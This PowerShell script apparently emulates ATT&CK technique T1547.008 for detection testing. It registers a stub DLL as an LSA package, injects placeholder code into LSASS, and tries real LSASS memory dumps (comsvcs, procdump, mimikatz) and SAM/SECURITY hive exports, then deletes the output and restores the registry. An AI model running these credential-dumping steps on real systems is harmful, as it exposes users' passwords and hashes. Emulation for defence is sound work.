Write-Host "[T1547.008] LSASS Driver Persistence" -ForegroundColor Red

$driverDll = "$env:TEMP\lsadrv.dll"
$pe = [byte[]]@(0x4D, 0x5A, 0x90, 0x00) + (New-Object byte[] 4092)
foreach ($exp in @("SpLsaModeInitialize","SpInitialize","SpShutDown","SpGetInfo")) {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($exp)
    $offset = 512 + ([Array]::IndexOf(@("SpLsaModeInitialize","SpInitialize","SpShutDown","SpGetInfo"), $exp) * 64)
    [Array]::Copy($bytes, 0, $pe, $offset, $bytes.Length)
}
[System.IO.File]::WriteAllBytes($driverDll, $pe)
Write-Host "[+] Dropped DLL: $driverDll" -ForegroundColor Yellow

try {
    Copy-Item $driverDll "$env:SYSTEMROOT\System32\lsadrv.dll" -Force -ErrorAction Stop
    Write-Host "[+] Copied to System32" -ForegroundColor Yellow
} catch { Write-Host "[-] System32 write blocked (expected without admin)" }

$lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
try {
    $origSec = (Get-ItemProperty -Path $lsaKey -Name "Security Packages" -ErrorAction Stop)."Security Packages"
    Set-ItemProperty -Path $lsaKey -Name "Security Packages" -Value (@($origSec) + @("lsadrv")) -ErrorAction Stop
    Write-Host "[+] Added lsadrv to Security Packages" -ForegroundColor Yellow
} catch { Write-Host "[-] Security Packages write blocked (expected without admin)" }

try {
    $origAuth = (Get-ItemProperty -Path $lsaKey -Name "Authentication Packages" -ErrorAction Stop)."Authentication Packages"
    Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value (@($origAuth) + @("lsadrv")) -ErrorAction Stop
    Write-Host "[+] Added lsadrv to Authentication Packages" -ForegroundColor Yellow
} catch { Write-Host "[-] Auth Packages write blocked (expected without admin)" }

if (-not ('LsassDrv' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class LsassDrv {
        [DllImport("secur32.dll", CharSet=CharSet.Unicode)]
        public static extern int AddSecurityPackage(string name, IntPtr opts);
        [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(int a, bool b, int p);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, int s, int t, int p);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] buf, int s, ref int w);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, int s, IntPtr fn, IntPtr p, int f, ref int t);
        [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
        [DllImport("dbghelp.dll", SetLastError=true)]
        public static extern bool MiniDumpWriteDump(IntPtr hProcess, int pid, IntPtr hFile, int dumpType, IntPtr ep, IntPtr us, IntPtr cb);
        [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern IntPtr CreateFile(string f, int a, int s, IntPtr sa, int d, int fl, IntPtr t);
    }
'@
}

Write-Host "[*] Calling AddSecurityPackage('lsadrv')..."
$r = [LsassDrv]::AddSecurityPackage("lsadrv", [IntPtr]::Zero)
Write-Host "    Result: 0x$($r.ToString('X8'))"

$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    Write-Host "[*] LSASS PID: $($lsass.Id)"

    Write-Host "[*] OpenProcess PROCESS_ALL_ACCESS on LSASS..."
    $h = [LsassDrv]::OpenProcess(0x1FFFFF, $false, $lsass.Id)
    if ($h -ne [IntPtr]::Zero) {
        Write-Host "[+] LSASS handle: $h" -ForegroundColor Yellow

        Write-Host "[*] Attempting MiniDumpWriteDump..."
        $dumpPath = "$env:TEMP\debug_$((Get-Random -Max 9999)).dmp"
        $fh = [LsassDrv]::CreateFile($dumpPath, 0x40000000, 0, [IntPtr]::Zero, 2, 0, [IntPtr]::Zero)
        if ($fh -ne [IntPtr]::new(-1)) {
            $dumped = [LsassDrv]::MiniDumpWriteDump($h, $lsass.Id, $fh, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
            Write-Host "    MiniDump result: $dumped"
            [LsassDrv]::CloseHandle($fh) | Out-Null
            Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue
        } else { Write-Host "    Dump file create failed" }

        Write-Host "[*] VirtualAllocEx in LSASS (RWX)..."
        $alloc = [LsassDrv]::VirtualAllocEx($h, [IntPtr]::Zero, 4096, 0x3000, 0x40)
        if ($alloc -ne [IntPtr]::Zero) {
            Write-Host "[+] Allocated RWX in LSASS: 0x$($alloc.ToString('X'))" -ForegroundColor Yellow
            $shellcode = [byte[]]@(0x90, 0x90, 0x90, 0xCC) + (New-Object byte[] 60)
            $w = 0
            [LsassDrv]::WriteProcessMemory($h, $alloc, $shellcode, $shellcode.Length, [ref]$w) | Out-Null
            Write-Host "[+] WriteProcessMemory: $w bytes into LSASS" -ForegroundColor Yellow
            $loadLib = [LsassDrv]::GetProcAddress([LsassDrv]::GetModuleHandle("kernel32.dll"), "LoadLibraryW")
            $tid = 0
            $thread = [LsassDrv]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [ref]$tid)
            Write-Host "[*] CreateRemoteThread in LSASS: tid=$tid handle=$thread"
        } else { Write-Host "[-] VirtualAllocEx denied" }

        [LsassDrv]::CloseHandle($h) | Out-Null
    } else {
        Write-Host "[-] OpenProcess denied (error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    Write-Host "[*] OpenProcess PROCESS_QUERY_INFORMATION..."
    $h2 = [LsassDrv]::OpenProcess(0x0400, $false, $lsass.Id)
    Write-Host "    Handle: $h2"
    if ($h2 -ne [IntPtr]::Zero) { [LsassDrv]::CloseHandle($h2) | Out-Null }

    Write-Host "[*] OpenProcess PROCESS_VM_READ..."
    $h3 = [LsassDrv]::OpenProcess(0x0010, $false, $lsass.Id)
    Write-Host "    Handle: $h3"
    if ($h3 -ne [IntPtr]::Zero) { [LsassDrv]::CloseHandle($h3) | Out-Null }
}

Write-Host "[*] rundll32 comsvcs.dll MiniDump..."
$lsassPid = (Get-Process lsass -ErrorAction SilentlyContinue).Id
if ($lsassPid) {
    & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid "$env:TEMP\lsass_comsvcs.dmp" full 2>&1
    Remove-Item "$env:TEMP\lsass_comsvcs.dmp" -Force -ErrorAction SilentlyContinue
}

Write-Host "[*] procdump spawn attempt..."
Start-Process "procdump.exe" -ArgumentList "-accepteula","-ma","lsass.exe","$env:TEMP\ls.dmp" -NoNewWindow -ErrorAction SilentlyContinue -Wait:$false
Start-Process "procdump64.exe" -ArgumentList "-accepteula","-ma","lsass.exe","$env:TEMP\ls.dmp" -NoNewWindow -ErrorAction SilentlyContinue -Wait:$false

Write-Host "[*] mimikatz spawn attempt..."
Start-Process "mimikatz.exe" -ArgumentList "`"privilege::debug`"","`"sekurlsa::logonpasswords`"","exit" -NoNewWindow -ErrorAction SilentlyContinue -Wait:$false

Write-Host "[*] SAM/SYSTEM/SECURITY hive dump..."
& reg.exe save HKLM\SAM "$env:TEMP\sam.hiv" /y 2>&1
& reg.exe save HKLM\SYSTEM "$env:TEMP\sys.hiv" /y 2>&1
& reg.exe save HKLM\SECURITY "$env:TEMP\sec.hiv" /y 2>&1
Remove-Item "$env:TEMP\sam.hiv","$env:TEMP\sys.hiv","$env:TEMP\sec.hiv" -Force -ErrorAction SilentlyContinue

Write-Host "[*] Cleanup..."
Remove-Item $driverDll -Force -ErrorAction SilentlyContinue
Remove-Item "$env:SYSTEMROOT\System32\lsadrv.dll" -Force -ErrorAction SilentlyContinue
try { Set-ItemProperty -Path $lsaKey -Name "Security Packages" -Value $origSec -ErrorAction Stop } catch {}
try { Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value $origAuth -ErrorAction Stop } catch {}

Write-Host "[T1547.008] Done." -ForegroundColor Cyan
